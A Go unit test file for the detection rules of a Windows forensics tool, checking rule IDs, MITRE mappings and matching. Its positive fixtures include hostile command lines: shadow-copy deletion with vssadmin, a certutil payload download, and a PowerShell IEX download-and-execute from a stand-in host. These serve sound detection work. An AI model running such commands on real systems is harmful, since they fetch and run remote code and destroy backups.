package detection

import (
	"io/fs"
	"strings"
	"testing"

	"DFIRFlow/internal/normalizer"
)

// embeddedCases donne, pour chaque règle embarquée, au moins un positif et un
// négatif (constitution VI, research R7).
var embeddedCases = map[string]struct{ pos, neg []normalizer.Event }{
	"proc_creation_powershell_encoded.yml": {
		pos: []normalizer.Event{
			proc(1, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "powershell -nop /enc SQBFAFgA"),
			proc4688(2, `C:\Program Files\PowerShell\7\pwsh.exe`, "pwsh -EncodedCommand SQBFAFgA"),
		},
		neg: []normalizer.Event{
			proc(3, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "powershell -File x.ps1"),
			proc(4, `C:\Windows\System32\cmd.exe`, "cmd /c echo -enc"),
			proc4688(5, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "powershell -nop"),
		},
	},
	"proc_creation_vssadmin_delete_shadows.yml": {
		pos: []normalizer.Event{
			proc(1, `C:\Windows\System32\vssadmin.exe`, "vssadmin.exe Delete Shadows /All /Quiet"),
			proc4688(2, `C:\Windows\System32\vssadmin.exe`, "vssadmin delete shadows /all"),
		},
		neg: []normalizer.Event{
			proc(3, `C:\Windows\System32\vssadmin.exe`, "vssadmin list shadows"),
			proc4688(4, `C:\Windows\System32\vssadmin.exe`, "vssadmin list shadows"),
		},
	},
	"proc_creation_certutil_download.yml": {
		pos: []normalizer.Event{
			proc(1, `C:\Windows\System32\certutil.exe`, "certutil.exe -urlcache -split -f http://x/a.exe a.exe"),
			proc4688(2, `C:\Windows\System32\certutil.exe`, "certutil /urlcache /f http://x/a a"),
		},
		neg: []normalizer.Event{
			proc(3, `C:\Windows\System32\certutil.exe`, "certutil -hashfile a.exe SHA256"),
			proc4688(4, `C:\Windows\System32\certutil.exe`, "certutil -hashfile a.exe SHA256"),
		},
	},
	"registry_set_run_key.yml": {
		pos: []normalizer.Event{evtx(sysmonCh, "Microsoft-Windows-Sysmon", 13, map[string]string{"EventType": "SetValue", "TargetObject": `HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\Updater`}, 1)},
		neg: []normalizer.Event{
			evtx(sysmonCh, "Microsoft-Windows-Sysmon", 12, map[string]string{"EventType": "CreateKey", "TargetObject": `HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\Updater`}, 2),
			evtx(sysmonCh, "Microsoft-Windows-Sysmon", 13, map[string]string{"EventType": "SetValue", "TargetObject": `HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall\x`}, 3),
		},
	},
	"ps_script_download_execute.yml": {
		pos: []normalizer.Event{evtx(psCh, "Microsoft-Windows-PowerShell", 4104, map[string]string{"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x/a')"}, 1)},
		neg: []normalizer.Event{
			evtx(psCh, "Microsoft-Windows-PowerShell", 4104, map[string]string{"ScriptBlockText": "(New-Object Net.WebClient).DownloadFile('http://x/a', 'a.zip')"}, 2),
			evtx(psCh, "Microsoft-Windows-PowerShell", 4103, map[string]string{"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x/a')"}, 3),
		},
	},
	"security_log_cleared.yml": {
		pos: []normalizer.Event{evtx("Security", "Microsoft-Windows-Eventlog", 1102, nil, 1)},
		neg: []normalizer.Event{
			evtx("Security", "Some-Other-Provider", 1102, nil, 2),
			evtx("System", "Microsoft-Windows-Eventlog", 1102, nil, 3),
			evtx("Security", "Microsoft-Windows-Eventlog", 1100, nil, 4),
		},
	},
	"system_log_cleared.yml": {
		pos: []normalizer.Event{evtx("System", "Microsoft-Windows-Eventlog", 104, nil, 1)},
		neg: []normalizer.Event{evtx("System", "Other", 104, nil, 2), evtx("Security", "Microsoft-Windows-Eventlog", 104, nil, 3)},
	},
	"audit_policy_changed.yml": {
		pos: []normalizer.Event{evtx("Security", "Microsoft-Windows-Security-Auditing", 4719, nil, 1)},
		neg: []normalizer.Event{evtx("Security", "Microsoft-Windows-Security-Auditing", 4720, nil, 2)},
	},
	"user_account_created.yml": {
		pos: []normalizer.Event{evtx("Security", "Microsoft-Windows-Security-Auditing", 4720, map[string]string{"TargetUserName": "eve"}, 1)},
		neg: []normalizer.Event{evtx("Security", "Microsoft-Windows-Security-Auditing", 4726, nil, 2)},
	},
	"privileged_group_member_added.yml": {
		pos: []normalizer.Event{
			evtx("Security", "Microsoft-Windows-Security-Auditing", 4732, map[string]string{"TargetSid": "S-1-5-32-544"}, 1),
			evtx("Security", "Microsoft-Windows-Security-Auditing", 4728, map[string]string{"TargetSid": "S-1-5-21-1-2-3-512"}, 2),
			evtx("Security", "Microsoft-Windows-Security-Auditing", 4756, map[string]string{"TargetSid": "S-1-5-21-1-2-3-519"}, 3),
		},
		neg: []normalizer.Event{
			evtx("Security", "Microsoft-Windows-Security-Auditing", 4732, map[string]string{"TargetSid": "S-1-5-32-545"}, 4),
			evtx("Security", "Microsoft-Windows-Security-Auditing", 4728, map[string]string{"TargetSid": "S-1-5-21-1-2-3-513"}, 5),
			evtx("Security", "Microsoft-Windows-Security-Auditing", 4624, map[string]string{"TargetSid": "S-1-5-32-544"}, 6),
		},
	},
	"service_installed.yml": {
		pos: []normalizer.Event{evtx("System", "Service Control Manager", 7045, map[string]string{"ServiceName": "x"}, 1)},
		neg: []normalizer.Event{evtx("System", "Other", 7045, nil, 2), evtx("System", "Service Control Manager", 7036, nil, 3)},
	},
	"scheduled_task_created.yml": {
		pos: []normalizer.Event{evtx("Security", "Microsoft-Windows-Security-Auditing", 4698, nil, 1)},
		neg: []normalizer.Event{evtx("Security", "Microsoft-Windows-Security-Auditing", 4699, nil, 2)},
	},
}

func TestEmbeddedRules(t *testing.T) {
	rs, err := Load("")
	if err != nil {
		t.Fatal(err)
	}
	if len(rs.Applied) != 12 || rs.Skipped != 0 || len(rs.Refused) != 0 || rs.Restricted != nil || rs.Source != Embedded || len(rs.Version) != 16 {
		t.Fatalf("embedded set: %d applied, %d skipped, %v refused, source %s", len(rs.Applied), rs.Skipped, rs.Refused, rs.Source)
	}
	want := map[string][2]string{ // fichier -> id, technique (data-model.md)
		"security_log_cleared.yml":                  {"8ad87a09-d977-4445-9e5a-962e9023846b", "T1070.001"},
		"system_log_cleared.yml":                    {"7f021602-7eb2-46cc-bd9c-8791ff6b80c6", "T1070.001"},
		"audit_policy_changed.yml":                  {"16e98cfe-8ffe-44bc-8353-804570a5f7b3", "T1562.002"},
		"user_account_created.yml":                  {"92be069d-0b8f-4ecd-a4c3-236eb494fa35", "T1136.001"},
		"privileged_group_member_added.yml":         {"c45e29cd-cdb3-495e-9bb4-596a96da98bb", "T1098"},
		"service_installed.yml":                     {"937be0a0-b743-4102-83e6-25f8c5eed60b", "T1543.003"},
		"scheduled_task_created.yml":                {"5f1c65f2-02d2-4919-abcd-8f4b6066b681", "T1053.005"},
		"proc_creation_powershell_encoded.yml":      {"94b506b2-9a79-4e99-9e7c-8de7ec0280c5", "T1059.001"},
		"proc_creation_vssadmin_delete_shadows.yml": {"640e0339-c6ec-44c6-ac37-cf83d4d59f37", "T1490"},
		"proc_creation_certutil_download.yml":       {"fd6c81ea-7967-4928-8a61-fcd5af347728", "T1105"},
		"registry_set_run_key.yml":                  {"33591d7c-fcc9-4365-83e7-4bd5e79976fc", "T1547.001"},
		"ps_script_download_execute.yml":            {"5aa5ae5e-ab5b-4d44-85ad-7fde1a9291b3", "T1059.001"},
	}
	names, _ := fs.Glob(embedded, "rules/*.yml")
	if len(names) != len(embeddedCases) {
		t.Errorf("%d embedded rules, %d with test cases", len(names), len(embeddedCases))
	}
	for _, r := range rs.Applied {
		name := strings.TrimPrefix(r.File, "embedded:")
		if w := want[name]; r.ID != w[0] || r.MITRE != w[1] {
			t.Errorf("%s: id %s mitre %s, want %v", name, r.ID, r.MITRE, w)
		}
		c, ok := embeddedCases[name]
		if !ok || len(c.pos) == 0 || len(c.neg) == 0 {
			t.Errorf("%s: missing positive or negative case", name)
			continue
		}
		for _, ev := range c.pos {
			if !matches(rs, r, ev) {
				t.Errorf("%s: positive event %d not detected", name, *ev.EventID)
			}
		}
		for _, ev := range c.neg {
			if matches(rs, r, ev) {
				t.Errorf("%s: negative event %d (%s, %v) detected", name, *ev.EventID, ev.Channel, ev.Metadata)
			}
		}
	}
}

// matches applique r comme Run : seulement aux événements de son canal.
func matches(rs *Ruleset, r *Rule, ev normalizer.Event) bool {
	for _, list := range rs.candidates(&ev) {
		for _, e := range list {
			if e.rule == r {
				return e.src.accepts(&ev) && r.match(&ev, e.src)
			}
		}
	}
	return false
}

// proc et proc4688 décrivent un lancement de processus vu par Sysmon 1 et par
// Security 4688 (renommage de la table des catégories).
func proc(i int, image, cl string) normalizer.Event {
	return evtx(sysmonCh, "Microsoft-Windows-Sysmon", 1, map[string]string{"Image": image, "CommandLine": cl}, i)
}

func proc4688(i int, image, cl string) normalizer.Event {
	return evtx("Security", "Microsoft-Windows-Security-Auditing", 4688, map[string]string{"NewProcessName": image, "CommandLine": cl}, i)
}
